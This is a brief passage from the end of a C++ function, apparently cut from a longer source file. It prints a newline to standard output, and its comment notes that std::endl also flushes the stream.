    std::cout << std::endl;        // also flushes via endl
}

